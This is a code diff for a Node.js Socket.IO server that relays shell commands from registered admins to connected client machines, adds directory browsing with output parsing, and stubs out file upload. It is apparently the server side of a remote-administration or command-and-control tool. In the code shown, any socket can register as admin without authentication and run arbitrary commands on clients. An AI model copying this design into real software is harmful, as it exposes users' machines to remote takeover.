@@ -1,11 +1,47 @@
 const { Server } = require('socket.io');
+const { SOCKET_EVENTS } = require('../config/socketEvents');
+const { buildRootDirectoryCommand, buildListDirectoryCommand } = require('../utils/cmdBuild');
+const { parseDirectoryOutput } = require('../utils/dirParser');
+const { getWindowsParentPath, getUnixParentPath } = require('../utils/pathUtils');
 
 // Store connected clients and admins
 const clients = new Map(); // socketId -> { socket, info }
 const admins = new Map();  // socketId -> socket
 
 // Pending commands waiting for response
-const pendingCommands = new Map(); // commandId -> { adminSocketId, clientSocketId }
+// value: { adminSocketId, clientSocketId, isListDir?, listDirPath?, platform?, homeDir? }
+const pendingCommands = new Map();
+
+/**
+ * Resolve list-dir path and build the shell command for the client
+ */
+function resolveListDirCommand(command, client) {
+  const platform = client.info?.platform || 'win32';
+  const homeDir = client.info?.homeDir || '';
+  const { path: reqPath, currentPath = '' } = command;
+
+  let pathToUse = currentPath;
+  if (reqPath === 'root' || reqPath === '' || reqPath === undefined) {
+    pathToUse = '';
+  } else if (reqPath === '..') {
+    if (platform === 'win32') {
+      pathToUse = getWindowsParentPath(currentPath);
+      if (pathToUse === null) pathToUse = '';
+    } else {
+      pathToUse = getUnixParentPath(currentPath, homeDir);
+      if (pathToUse === null) pathToUse = homeDir || '/';
+    }
+  } else {
+    pathToUse = reqPath;
+  }
+
+  const stringCommand =
+    pathToUse === ''
+      ? buildRootDirectoryCommand(platform)
+      : buildListDirectoryCommand(pathToUse, platform);
+
+  return { stringCommand, pathForParser: pathToUse, platform };
+}
 
 /**
  * Generate a unique command ID
@@ -59,91 +95,121 @@ function initializeSocketIO(httpServer) {
     console.log(`🔌 New socket connection: ${socket.id}`);
 
     // Client registration
-    socket.on('register-client', (info) => {
+    socket.on(SOCKET_EVENTS.REGISTER_CLIENT, (info) => {
       console.log(`📱 Client registered: ${socket.id}`, info);
       clients.set(socket.id, { socket, info });
-      
-      // Notify all admins about new client
-      broadcastToAdmins(io, 'client-connected', {
+
+      broadcastToAdmins(io, SOCKET_EVENTS.CLIENT_CONNECTED, {
         socketId: socket.id,
-        info
+        info,
       });
-      
-      // Send current clients list to the new client (optional)
+
       socket.emit('registration-success', { socketId: socket.id });
     });
 
     // Admin registration
-    socket.on('register-admin', () => {
+    socket.on(SOCKET_EVENTS.REGISTER_ADMIN, () => {
       console.log(`👤 Admin registered: ${socket.id}`);
       admins.set(socket.id, socket);
-      
-      // Send all current clients to the new admin
-      socket.emit('clients-list', getAllClientsInfo());
+
+      socket.emit(SOCKET_EVENTS.CLIENTS_LIST, getAllClientsInfo());
     });
 
-    // Admin sends command to a specific client
-    socket.on('send-command', ({ clientSocketId, command }) => {
-      console.log(`📤 Admin ${socket.id} sending command to client ${clientSocketId}: ${command}`);
-      
+    // Admin sends command to a specific client (command: string or object e.g. { type, path, currentPath })
+    socket.on(SOCKET_EVENTS.SEND_COMMAND, ({ clientSocketId, command }) => {
       const client = clients.get(clientSocketId);
-      if (client) {
-        const commandId = generateCommandId();
-        
-        // Store pending command
-        pendingCommands.set(commandId, {
-          adminSocketId: socket.id,
-          clientSocketId
-        });
-        
-        // Send command to client
-        client.socket.emit('execute-command', {
-          commandId,
-          command
-        });
-        
-        // Acknowledge to admin
-        socket.emit('command-sent', { commandId, clientSocketId });
-      } else {
-        socket.emit('command-error', {
+      if (!client) {
+        socket.emit(SOCKET_EVENTS.COMMAND_ERROR, {
           error: 'Client not found or disconnected',
-          clientSocketId
+          clientSocketId,
         });
+        return;
       }
+
+      const commandId = generateCommandId();
+      let payloadToSend = command;
+      let listDirPath = '';
+      let listDirPlatform = client.info?.platform || 'win32';
+      const commandType = command && typeof command === 'object' ? command.type : undefined;
+
+      if (commandType === 'list-dir') {
+        try {
+          const { stringCommand, pathForParser, platform } = resolveListDirCommand(command, client);
+          payloadToSend = stringCommand;
+          listDirPath = pathForParser;
+          listDirPlatform = platform;
+        } catch (err) {
+          socket.emit(SOCKET_EVENTS.COMMAND_ERROR, {
+            error: err.message || 'Failed to build list-dir command',
+            clientSocketId,
+          });
+          return;
+        }
+      }
+      else if (commandType === 'upload') {       
+      }
+
+      pendingCommands.set(commandId, {
+        adminSocketId: socket.id,
+        clientSocketId,
+        type: commandType,
+        listDirPath,
+        listDirPlatform,
+      });
+
+      client.socket.emit(SOCKET_EVENTS.EXECUTE_COMMAND, {
+        commandId,
+        command: payloadToSend,
+      });
+
+      socket.emit(SOCKET_EVENTS.COMMAND_SENT, { commandId, clientSocketId });
     });
 
     // Client sends command result back
-    socket.on('command-result', ({ commandId, result, error }) => {
-      console.log(`📥 Received result for command ${commandId}`);
-      
+    socket.on(SOCKET_EVENTS.COMMAND_RESULT, ({ commandId, result, error }) => {
       const pending = pendingCommands.get(commandId);
-      if (pending) {
-        const admin = admins.get(pending.adminSocketId);
-        if (admin) {
-          admin.emit('command-response', {
-            commandId,
-            clientSocketId: pending.clientSocketId,
-            result,
-            error
-          });
+      if (!pending) return;
+      pendingCommands.delete(commandId);
+
+      const admin = admins.get(pending.adminSocketId);
+      if (!admin) return;
+
+      let resultToSend = result;
+      if (pending.type === 'list-dir' && !error && result != null) {
+        try {
+          const raw = typeof result === 'string' ? result : String(result);
+          const parsed = parseDirectoryOutput(raw, pending.listDirPlatform, pending.listDirPath);
+          resultToSend = {
+            ...parsed,
+            currentPath: pending.listDirPath,
+          };
+        } catch (parseErr) {
+          resultToSend = { directories: [], files: [], currentPath: pending.listDirPath };
         }
-        pendingCommands.delete(commandId);
       }
+      else if (pending.type === 'upload') {
+        resultToSend = typeof result === 'string' ? JSON.parse(result) : result;
+      }
+
+      admin.emit(SOCKET_EVENTS.COMMAND_RESPONSE, {
+        commandId,
+        clientSocketId: pending.clientSocketId,
+        result: resultToSend,
+        error,
+      });
     });
 
     // Handle disconnection
-    socket.on('disconnect', () => {
+    socket.on(SOCKET_EVENTS.DISCONNECT, () => {
       console.log(`🔌 Disconnected: ${socket.id}`);
-      
-      // Check if it was a client
+
       if (clients.has(socket.id)) {
         const clientInfo = clients.get(socket.id).info;
         clients.delete(socket.id);
-        
-        // Notify admins about client disconnection
-        broadcastToAdmins(io, 'client-disconnected', {
+
+        broadcastToAdmins(io, SOCKET_EVENTS.CLIENT_DISCONNECTED, {
           socketId: socket.id,
-          info: clientInfo
+          info: clientInfo,
         });
       }
       
